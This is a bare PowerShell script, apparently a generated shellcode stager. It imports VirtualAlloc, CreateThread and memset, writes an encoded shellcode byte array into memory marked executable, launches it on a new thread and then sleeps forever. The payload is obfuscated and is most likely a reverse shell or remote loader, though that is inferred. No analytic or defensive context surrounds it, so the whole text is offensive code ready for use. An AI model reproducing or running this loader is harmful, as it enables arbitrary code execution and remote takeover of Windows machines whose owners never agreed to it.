$l8g4 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $l8g4 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x6c,0xcc,0x9b,0x7f,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x53,0x13,0x03,0x53,0x13,0x83,0xeb,0x90,0x2e,0x6e,0x83,0x80,0x2d,0x91,0x7c,0x50,0x52,0x1b,0x99,0x61,0x52,0x7f,0xe9,0xd1,0x62,0x0b,0xbf,0xdd,0x09,0x59,0x54,0x56,0x7f,0x76,0x5b,0xdf,0xca,0xa0,0x52,0xe0,0x67,0x90,0xf5,0x62,0x7a,0xc5,0xd5,0x5b,0xb5,0x18,0x17,0x9c,0xa8,0xd1,0x45,0x75,0xa6,0x44,0x7a,0xf2,0xf2,0x54,0xf1,0x48,0x12,0xdd,0xe6,0x18,0x15,0xcc,0xb8,0x13,0x4c,0xce,0x3b,0xf0,0xe4,0x47,0x24,0x15,0xc0,0x1e,0xdf,0xed,0xbe,0xa0,0x09,0x3c,0x3e,0x0e,0x74,0xf1,0xcd,0x4e,0xb0,0x35,0x2e,0x25,0xc8,0x46,0xd3,0x3e,0x0f,0x35,0x0f,0xca,0x94,0x9d,0xc4,0x6c,0x71,0x1c,0x08,0xea,0xf2,0x12,0xe5,0x78,0x5c,0x36,0xf8,0xad,0xd6,0x42,0x71,0x50,0x39,0xc3,0xc1,0x77,0x9d,0x88,0x92,0x16,0x84,0x74,0x74,0x26,0xd6,0xd7,0x29,0x82,0x9c,0xf5,0x3e,0xbf,0xfe,0x91,0xf3,0xf2,0x00,0x61,0x9c,0x85,0x73,0x53,0x03,0x3e,0x1c,0xdf,0xcc,0x98,0xdb,0x20,0xe7,0x5d,0x73,0xdf,0x08,0x9e,0x5d,0x1b,0x5c,0xce,0xf5,0x8a,0xdd,0x85,0x05,0x33,0x08,0x33,0x03,0xa3,0x8d,0xa9,0x06,0x7e,0x9a,0x33,0x19,0x91,0x01,0xbd,0xff,0xc1,0xe5,0xed,0xaf,0xa1,0x55,0x4e,0x00,0x49,0xbc,0x41,0x7f,0x69,0xbf,0x8b,0xe8,0x03,0x50,0x62,0x40,0xbb,0xc9,0x2f,0x1a,0x5a,0x15,0xfa,0x66,0x5c,0x9d,0x09,0x96,0x12,0x56,0x67,0x84,0xc2,0x96,0x32,0xf6,0x44,0xa8,0xe8,0x9d,0x68,0x3c,0x17,0x34,0x3f,0xa8,0x15,0x61,0x77,0x77,0xe5,0x44,0x0c,0xbe,0x73,0x27,0x7a,0xbf,0x93,0xa7,0x7a,0xe9,0xf9,0xa7,0x12,0x4d,0x5a,0xf4,0x07,0x92,0x77,0x68,0x94,0x07,0x78,0xd9,0x49,0x8f,0x10,0xe7,0xb4,0xe7,0xbe,0x18,0x93,0xf9,0x83,0xce,0xdd,0x8f,0xed,0xd2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pQ3J=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pQ3J.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pQ3J,0,0,0);for (;;){Start-sleep 60};